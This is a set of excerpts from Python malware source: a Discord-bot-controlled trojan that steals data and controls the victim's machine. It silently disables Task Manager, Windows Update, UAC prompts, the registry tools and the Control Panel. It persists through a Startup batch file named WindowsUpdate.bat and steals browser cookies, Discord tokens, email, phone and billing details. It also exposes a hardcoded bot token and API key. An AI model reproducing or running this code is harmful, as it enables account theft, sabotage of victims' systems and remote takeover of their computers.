...
with open(os.devnull, "w") as f:
    subprocess.call("reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_DWORD /d 1 /f", shell=True, stdout=f, stderr=f)

import os
import subprocess

with open(os.devnull, "w") as f:
    subprocess.call("reg add HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate\AU /v NoAutoUpdate /t REG_DWORD /d 1 /f", shell=True, stdout=f, stderr=f)

import os
import subprocess

with open(os.devnull, "w") as f:
    subprocess.call("reg add HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate /v DisableWindowsUpdateAccess /t REG_DWORD /d 1 /f", shell=True, stdout=f, stderr=f)

import os
import subprocess

with open(os.devnull, "w") as f:
    subprocess.call("reg add HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v ConsentPromptBehaviorAdmin /t REG_DWORD /d 0 /f", shell=True, stdout=f, stderr=f)

import os
import subprocess

with open(os.devnull, "w") as f:
    subprocess.call("reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableRegistryTools /t REG_DWORD /d 1 /f", shell=True, stdout=f, stderr=f)

import os
import subprocess

with open(os.devnull, "w") as f:
    subprocess.call("reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoRun /t REG_DWORD /d 1 /f", shell=True, stdout=f, stderr=f)

import os
import subprocess

with open(os.devnull, "w") as f:
    subprocess.call("reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoWindowsExplorer /t REG_DWORD /d 1 /f", shell=True, stdout=f, stderr=f)

import os
import subprocess

with open(os.devnull, "w") as f:
    subprocess.call("reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoControlPanel /t REG_DWORD /d 1 /f", shell=True, stdout=f, stderr=f)
...
update_file = os.path.join(program_directory, "files", "update.exe")

subprocess.Popen(update_file, shell=True)

bat_file_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Roaming", "Microsoft", "Windows", "Start Menu", "Programs", "Startup", "WindowsUpdate.bat")
with open(bat_file_path, "w") as bat_file:
    bat_file.write(f"@echo off\n")
    bat_file.write(f"start {program_path}\n")

subprocess.call(f"cmd /c {bat_file_path}", shell=True)
...
token = 'MTA3MzIwMDk0MzA5ODc3MzUzNA.GbapeD.FidJdE31cJM8gujjzy-c26BP9xbaP972TdzRVA'
global appdata
...
--> !getcookies = Get victim google cookies
--> !remotepc = Get rdp file to connect to the victim computer
...
async def on_ready():
    ...
    import json
    with urllib.request.urlopen("https://api.ipgeolocation.io/ipgeo?apiKey=663c5352988a43389cba2d33d1443813") as url:
        data = json.loads(url.read().decode())
        flag = data['country_code2']
        ip = data['ip']
    import os
    total = []
    global number
...
async def on_message(message):
    if message.channel.name != channel_name:
        ...
        if message.content.startswith("!getcookies"):
            import os
            await get_chrome_cookies()
            await message.channel.send(file=discord.File(os.environ['TEMP'] + "\\cookies.txt"))
...
def get_embed(token, uid, email, phone, nitro, billing, ip, pc_username, pc_name, platform, username, user_id):
    embed = f"""
    Email: {email}
    Phone: {phone}
    Nitro: {nitro}
...
try:
    embed = get_embed(token, uid, email, phone, nitro, billing, ip, pc_username, pc_name, platform, username, user_id)
    await message.channel.send("[*] Command successfuly executed\n"+str(embed))
except Exception as e:
    pass
